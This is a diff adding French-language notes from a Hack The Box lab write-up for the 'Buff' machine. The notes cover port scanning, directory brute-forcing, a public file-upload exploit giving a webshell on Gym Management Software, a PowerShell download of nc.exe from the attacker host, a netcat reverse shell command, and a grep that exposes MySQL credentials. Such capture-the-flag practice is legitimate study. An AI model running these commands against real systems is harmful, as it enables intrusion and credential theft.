@@ -1,0 +1,137 @@
+buff
+2020-09-02T10:21:56Z
+
+Mes notes pour Buff.
+
+## nmap
+
+```
+kali@kali:/media/sf_htb/buff_10.198$ nmap -Pn -sV -p- 10.10.10.198
+Nmap scan report for 10.10.10.198
+Host is up (0.32s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 929.06 seconds
+
+```
+
+## website
+
+```
+kali@kali:/media/sf_htb/buff_10.198$ curl http://10.10.10.198:8080/contact.php | html2text 
+
+ Toggle navigation     About_Fitness
+    * Home
+    * Package
+    * Facilities
+    * About
+    * Contact
+[email               ]
+[********************]
+[Sign in]
+    * mrb3n's Bro Hut
+    * Made using Gym Management Software 1.0
+===============================================================================
+
+```
+
+## Gym Management Software
+
+Exploit : https://www.exploit-db.com/raw/48506
+
+```
+Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution (RCE) on the Hosting Webserver via uploading a maliciously crafted PHP file that bypasses the image upload filters.
+```
+
+Nous devons trouver upload.php selon la doc de l'exploit. Mais cette page n'existe pas.
+
+## gobuster
+
+Il existe bien un /upload.php, mais l'accès n'est pas permis.  
+
+```
+kali@kali:/media/sf_sync$ gobuster dir -u http://10.10.10.198:8080 -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 80 -a Linux
+[..]
+/ex (Status: 301)
+[..]
+/upload (Status: 301)
+```
+
+En revanche le /ex contient bien un fichier upload.php !
+
+## gym exploit
+
+J'exécute l'exploit sur la racine du site et j'obtiens un shell.
+
+```
+kali@kali:/media/sf_sync/practice/htb/buff_10.198$ python 48506.py http://10.10.10.198:8080/
+            /\
+/vvvvvvvvvvvv \--------------------------------------,                                                                                           
+`^^^^^^^^^^^^ /============BOKU====================="
+            \/
+
+[+] Successfully connected to webshell.
+C:\xampp\htdocs\gym\upload> 
+```
+
+
+
+On télécharge un nc.exe puis on établit un reverse shell plus adapté que le webshell.
+
+```
+# attacker
+kali@kali:/usr/share/windows-resources/binaries$ python3 -m http.server
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.10.198 - - [03/Sep/2020 15:10:27] "GET /nc.exe HTTP/1.1" 200 -
+```
+
+```
+# victim
+C:\xampp\htdocs\gym\upload> powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.15.38:8000/nc.exe','C:\xampp\htdocs\gym\upload\nc.exe')"
+
+C:\xampp\htdocs\gym\upload> nc.exe -nv 10.10.15.38 40000 -e cmd.exe
+```
+
+```
+# attacker 
+kali@kali:/usr/share/windows-resources/binaries$ sudo nc -nlvp 40000
+listening on [any] 40000 ...
+connect to [10.10.15.38] from (UNKNOWN) [10.10.10.198] 50703
+Microsoft Windows [Version 10.0.17134.1610]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\gym\upload>
+```
+
+enum
+
+Je remarque un port 3306 (mysql) en écoute. Je me mets en recherche de creds.
+
+```
+C:\xampp\htdocs\gym> findstr /spin "mysql" *.*
+New Text Document.txt:1:$mysql_host = "mysql16.000webhost.com";
+New Text Document.txt:2:$mysql_database = "a8743500_secure";
+New Text Document.txt:3:$mysql_user = "a8743500_secure";
+New Text Document.txt:4:$mysql_password = "ipad12345";packages.php:8:if (login_check($mysqli) == true) {
+```
+
+Je constate la présence d'un processus nommer cloudme.exe
+
+```
+tasklist /svc
+cmd.exe                       8624 N/A                                         
+conhost.exe                   8500 N/A                                         
+curl.exe                      8824 N/A                                         
+CloudMe.exe                   3668 N/A                                         
+timeout.exe                   3520 N/A                                         
+tasklist.exe                  8740 N/A  
+```
+
+https://p0i5on8.github.io/posts/hackthebox-buff/
+
+4c827b7074e99eefd49d05872185f7f8
+
